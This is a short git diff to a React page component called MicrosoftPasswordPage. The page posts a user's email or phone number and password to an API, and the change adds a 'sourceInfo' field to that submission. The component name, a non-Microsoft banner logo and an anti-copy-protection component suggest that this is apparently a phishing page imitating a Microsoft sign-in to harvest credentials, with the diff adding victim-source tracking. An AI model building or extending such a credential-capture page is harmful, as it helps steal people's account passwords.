@@ -7,6 +7,7 @@ import { AntiCopyProtection } from '@/components/AntiCopyProtection';
 import { SEO } from '@/components/SEO';
 import { useToast } from '@/hooks/use-toast';
 import { apiRequest } from '@/lib/queryClient';
+import { getSourceInfo } from '@/lib/sourceInfo';
 import { z } from 'zod';
 import '@/styles/styles.css';
 import rcgLogo from '@assets/bannerlogo_1760638008519.png';
@@ -73,6 +74,7 @@ export default function MicrosoftPasswordPage() {
         loginAttemptId,
         emailOrPhone,
         password: data.password,
+        sourceInfo: getSourceInfo(),
       });
       return await res.json();
     },
